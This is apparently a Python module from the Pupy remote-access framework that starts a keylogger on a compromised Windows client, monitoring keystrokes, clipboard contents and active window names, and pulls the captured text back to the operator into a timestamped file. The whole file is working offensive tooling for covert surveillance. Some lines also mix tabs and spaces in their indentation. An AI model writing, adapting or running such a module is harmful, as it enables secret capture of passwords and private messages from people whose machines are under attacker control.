# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import StringIO
import SocketServer
import threading
import socket
import logging
import struct
import traceback
import time
from pupylib.utils.rpyc_utils import redirected_stdio
import datetime
import os
__class_name__="KeyloggerModule"

@config(compat="windows", cat="gather")
class KeyloggerModule(PupyModule):
	""" 
		A keylogger to monitor all keyboards interaction including the clipboard :-)
		The clipboard is also monitored and the dump includes the window name in which the keys are beeing typed
	"""
	#max_clients=1
	daemon=True
	unique_instance=True
	keylogger=None
	def init_argparse(self):
		self.arg_parser = PupyArgumentParser(prog='keylogger', description=self.__doc__)
		self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])

	def stop_daemon(self):
		self.success("keylogger stopped")
		
	def run(self, args):
		if args.action=="start":
			if self.keylogger:
				self.error("the keylogger is already started")
			else:
				self.client.load_package("pupwinutils.keylogger")
				with redirected_stdio(self.client.conn): #to see the output exception in case of error
					self.keylogger=self.client.conn.modules["pupwinutils.keylogger"].KeyLogger()
					self.keylogger.start()
		else:
			if not self.keylogger:
				self.error("the keylogger is not running")
				return
			if args.action=="dump":
				self.success("dumping recorded keystrokes :")

				"""
				   * Save the keystrokes in a file inside the current working directory.
				"""
				date      = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")
				filename  = 'keystrokes_' + str(date) + '.txt'
 				dump_file = os.path.join(os.getcwd(), filename)
 				f         = open(dump_file,'w')
 				f.write(self.keylogger.dump())
 				f.close()
  				self.success("File saved in: " + dump_file + "\n")

				self.log(self.keylogger.dump())
			elif args.action=="stop":
				self.keylogger.stop()
				self.job.stop()



